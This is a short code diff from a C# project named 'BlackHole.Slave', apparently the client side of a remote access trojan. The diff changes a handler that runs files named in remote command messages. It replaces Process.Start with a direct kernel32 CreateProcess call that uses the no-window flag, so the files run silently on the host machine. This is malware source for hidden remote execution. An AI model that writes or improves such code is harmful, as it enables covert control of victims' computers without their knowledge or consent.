@@ -12,6 +12,7 @@ using System.Net;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using static BlackHole.Slave.Helper.NativeHelper.kernel32;
 
 namespace BlackHole.Slave
 {
@@ -445,15 +446,20 @@ namespace BlackHole.Slave
         private void ExecuteFile(ExecuteFileMessage message)
         {
             ExecuteSimpleOperation(message.WindowId, -1, "File execution",
-                () =>
-                {
-                    Process.Start(new ProcessStartInfo()
-                    {
-                        UseShellExecute = true,
-                        FileName = message.FilePath,
-                        CreateNoWindow = true,
-                    });
-                }, message.FilePath);
+            () =>
+            {
+                var si = new STARTUPINFO();
+                var pi = new PROCESS_INFORMATION();
+                var sap = new SECURITY_ATTRIBUTES();
+                var sat = new SECURITY_ATTRIBUTES();
+
+                var directory = Path.GetDirectoryName(message.FilePath);
+
+                const uint CreateNoWindow = 0x08000000;
+
+                CreateProcess(message.FilePath, "", ref sap, ref sat, false, CreateNoWindow, IntPtr.Zero, directory, ref si, out pi);
+
+            }, message.FilePath);
         }
     }
 }
